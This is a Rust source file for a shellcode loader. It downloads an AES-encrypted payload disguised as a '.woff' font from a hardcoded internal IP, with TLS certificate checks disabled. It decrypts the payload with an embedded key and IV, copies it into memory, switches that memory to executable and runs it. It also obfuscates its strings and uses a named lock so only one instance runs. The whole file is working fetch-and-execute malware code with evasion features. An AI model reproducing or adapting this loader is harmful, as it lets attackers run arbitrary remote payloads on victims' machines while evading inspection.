use std::process::exit;

//common use
use bytes::Bytes;
use region::{Protection, Allocation};
use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
use named_lock::NamedLock;
use named_lock::Result;

type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

const URL: &str = "http://192.168.68.73:8080/test.woff";

const AESKEY: &str = "oPqVTb-ieogwPT94";
const AESIV: &str  = "lbzPx4uGUpAx7Wap";

const LOCKNAME: &str = "RLOCK";

fn decrypt(data: &[u8], size: usize) -> Vec<u8> {
    let mut key = [0x42; 16];
    let mut iv = [0x24; 16];
    for (i, b) in obfstr::obfstr!(AESKEY).as_bytes().iter().enumerate() {
        key[i] = *b;
    }
    for (i, b) in obfstr::obfstr!(AESIV).as_bytes().iter().enumerate() {
        iv[i] = *b;
    }
    let mut buf: Vec<u8> = Vec::with_capacity(size);
    let _pt = Aes128CbcDec::new(&key.into(), &iv.into())
        .decrypt_padded_b2b_mut::<Pkcs7>(&data, &mut buf)
        .unwrap();
    return buf;
}

fn getscode(url: &str) -> Bytes {
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .build()
        .unwrap();
    let res = match client.get(url).send() {
        Ok(res) => res,
        Err(_) => panic!("")
    };
    let rbytes = match res.bytes() {
        Ok(b) => b,
        Err(_) => panic!("")
    };
    // note, skip the first 16 bytes since they are the IV, might want to remove the IV from being in code and 
    // add it to the decypt function
    let pt = decrypt(&rbytes[16..], rbytes.len());
    let ptb = Bytes::from(pt);
    return ptb;
}

fn dne() -> Result<(), region::Error> {
    //download the payload
    let rbytes = getscode(obfstr::obfstr!(URL));
    // allocate and copy
    unsafe {
        //allocate
        let base_addr: Allocation = region::alloc(rbytes.len(), Protection::READ_WRITE)?;
        //copy
        std::ptr::copy(rbytes.as_ptr() as  _, base_addr.as_ptr::<u8>() as *mut u8, rbytes.len());
        // change to ex and cast
        let ep: extern "C" fn() -> i32 = {
            region::protect(base_addr.as_ptr::<u8>(), rbytes.len(), region::Protection::READ_EXECUTE)?;
            std::mem::transmute(base_addr.as_ptr::<u8>())
        };
        //run it
        ep();
        Ok(())
    }
}

fn main() {
    let lock = match NamedLock::create(obfstr::obfstr!(LOCKNAME)) {
        Ok(lock) => lock,
        Err(_) => exit(0)
    };
    let _guard = match lock.lock() {
        Ok(g) => g,
        Err(_) => exit(0)
    };
    let _ = dne();
}
